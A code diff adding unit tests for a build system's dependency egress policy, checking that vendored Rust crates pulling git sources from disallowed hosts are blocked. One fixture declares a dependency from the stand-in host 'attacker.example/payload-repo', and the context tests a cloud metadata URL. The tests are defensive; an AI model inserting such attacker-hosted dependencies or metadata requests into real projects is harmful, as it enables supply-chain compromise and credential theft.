@@ -5,6 +5,7 @@ import {
   collectCargoPrefetchUrls,
   evaluatePrefetchEgressPolicy,
   evaluatePrefetchUrl,
+  evaluateVendoredEgressPolicy,
   stripTomlComments,
 } from "../src/modules/builder/egress-policy.js";
 
@@ -112,6 +113,47 @@ describe("evaluatePrefetchUrl — cargo's `<kind>+<url>` source forms", () => {
     expect(evaluatePrefetchUrl("https://169.254.169.254/latest/meta-data", ALLOWED)).toEqual({
       ok: false,
       reason: "Dependency prefetch URL targets a private, local, or metadata host: 169.254.169.254",
+    });
+  });
+});
+
+describe("evaluateVendoredEgressPolicy — a transitive dependency's own source", () => {
+  it("catches a disallowed host that only appears in a vendored crate's own Cargo.toml", async () => {
+    const vendorDir = await sourceTree({
+      "evil-helper-0.1.0/Cargo.toml": [
+        "[package]",
+        'name = "evil-helper"',
+        'version = "0.1.0"',
+        "",
+        "[dependencies]",
+        'payload = { git = "https://attacker.example/payload-repo" }',
+      ].join("\n"),
+      "evil-helper-0.1.0/.cargo-checksum.json": '{"files":{},"package":"deadbeef"}',
+    });
+
+    await expect(evaluateVendoredEgressPolicy(vendorDir, ALLOWED)).resolves.toEqual({
+      ok: false,
+      allowed_hosts: ALLOWED,
+      blocked_url: "https://attacker.example/payload-repo",
+      detail: "Dependency prefetch host is not in the allowlist: attacker.example",
+    });
+  });
+
+  it("passes a vendor tree where every transitive source is allowed", async () => {
+    const vendorDir = await sourceTree({
+      "soroban-sdk-22.0.0/Cargo.toml": [
+        "[package]",
+        'name = "soroban-sdk"',
+        'version = "22.0.0"',
+        "",
+        "[dependencies]",
+        'soroban-env-common = { git = "https://github.com/stellar/rs-soroban-env" }',
+      ].join("\n"),
+    });
+
+    await expect(evaluateVendoredEgressPolicy(vendorDir, ALLOWED)).resolves.toEqual({
+      ok: true,
+      allowed_hosts: ALLOWED,
     });
   });
 });
